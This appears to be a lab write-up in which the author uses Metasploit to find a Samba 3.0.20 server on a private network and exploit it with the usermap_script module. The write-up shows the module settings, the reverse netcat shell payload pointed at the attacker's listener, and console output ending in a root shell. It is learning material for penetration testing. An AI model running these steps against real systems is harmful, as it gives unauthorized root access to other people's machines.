# Samba Exploitation 
![image](https://user-images.githubusercontent.com/72777943/208243383-86b6f854-c042-441a-a9bc-dce0743f5e90.png)

[+] Operating System: Linux 

[+] Version: 3.0.20

## Scanning
### Commands
Firstly I started up Metasploit

$ `msfconsole`

Knowing I was looking for what version Samba was, I ran the auxiliary module in Metasploit.

$ `use auxiliary/scanner/smb/`

#### Output 
```Matching Modules
================

   #   Name                                         Disclosure Date  Rank    Check  Description
   
   -   ----                                         ---------------  ----    -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal  No     DCOM Exec
   1   auxiliary/scanner/smb/impacket/secretsdump                    normal  No     DCOM Exec
   2   auxiliary/scanner/smb/smb_ms17_010                            normal  No     MS17-010 SMB RCE Detection
   3   auxiliary/scanner/smb/psexec_loggedin_users                   normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
   4   auxiliary/scanner/smb/smb_enumusers_domain                    normal  No     SMB Domain User Enumeration
   5   auxiliary/scanner/smb/smb_enum_gpp                            normal  No     SMB Group Policy Preference Saved Passwords Enumeration
   6   auxiliary/scanner/smb/smb_login                               normal  No     SMB Login Check Scanner
   7   auxiliary/scanner/smb/smb_lookupsid                           normal  No     SMB SID User Enumeration (LookupSid)
   8   auxiliary/scanner/smb/pipe_auditor                            normal  No     SMB Session Pipe Auditor
   9   auxiliary/scanner/smb/pipe_dcerpc_auditor                     normal  No     SMB Session Pipe DCERPC Auditor
   10  auxiliary/scanner/smb/smb_enumshares                          normal  No     SMB Share Enumeration
   11  auxiliary/scanner/smb/smb_enumusers                           normal  No     SMB User Enumeration (SAM EnumUsers)
   12  auxiliary/scanner/smb/smb_version                             normal  No     SMB Version Detection
   13  auxiliary/scanner/smb/smb_uninit_cred                         normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   14  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal  No     WMI Exec


Interact with a module by name or index. For example info 14, use 14 or use auxiliary/scanner/smb/impacket/wmiexec
```
Next was to use option 12, as this would detect the version of SMB running on the targets machine.

$ `use auxiliary/scanner/smb/smb_version`
```Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.0.2.6         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  1                yes       The number of concurrent threads (max one per host)
```

After setting the **RHOSTS** option, I ran the **run** command. This outputted the version in question.
```
[*] 10.0.2.6:445          - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 10.0.2.6:445          - Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.0.2.6:             - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
#### **Version: 3.0.20**
Knowing the version of Samba running on the target machine I was able to then use the **search** command in Metasploit to find an exploit related to it.
```
use exploit/multi/samba/usermap_script
```
I set the follow options as previously including the **LHOST** which in this case would be my ip address.
```
Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.2.6         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.5         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```
Now that all the information was provided, the next step was to execute the **exploit** command and see if I was successfully able to exploit the vulnerability or not.

$ `exploit`
```msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.0.2.5:4444 
[*] Command shell session 2 opened (10.0.2.5:4444 -> 10.0.2.6:35869 ) at 2022-12-17 08:05:52 -0500

whoami
root
```
As shown above, I was successfully able to exploit this vulnerability and gain access to the machine as **root**
